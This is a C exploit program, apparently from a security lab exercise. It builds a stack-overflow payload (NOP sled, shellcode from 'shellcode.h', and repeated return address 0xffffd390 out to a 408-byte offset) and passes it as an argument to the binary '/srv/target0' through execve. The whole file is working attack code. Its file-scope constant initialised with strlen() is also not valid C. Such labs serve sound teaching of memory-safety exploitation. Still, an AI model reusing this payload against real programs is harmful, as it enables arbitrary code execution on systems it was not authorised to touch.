#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int OFFSET = 408;
const int NOP_COUNT = 300;
const int SHELLCODE_LENGTH = strlen(shellcode);
const int RETURN_ADDRESS_COUNT = (OFFSET - NOP_COUNT - SHELLCODE_LENGTH) / 4;
const char* RETURN_ADDRESS = "\x90\xd3\xff\xff";  // 0xffffd390

int main(void)
{
    char *args[3];
    char *env[1];

    // Create the exploit string
    char buf[OFFSET + 1];
    memset(buf, 0, sizeof(buf));

    // Add the NOP sled
    memset(buf, '\x90', NOP_COUNT);

    // Add the shellcode
    memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);

    // Add the return addresses
    char *return_address_ptr = buf + NOP_COUNT + SHELLCODE_LENGTH;
    for (int i = 0; i < RETURN_ADDRESS_COUNT; i++) {
        memcpy(return_address_ptr, RETURN_ADDRESS, 4);
        return_address_ptr += 4;
    }

    // Null-terminate the exploit  string
    buf[OFFSET] = '\0';

    // Set up the arguments for execve
    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    // Execute the target program with the exploit string
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}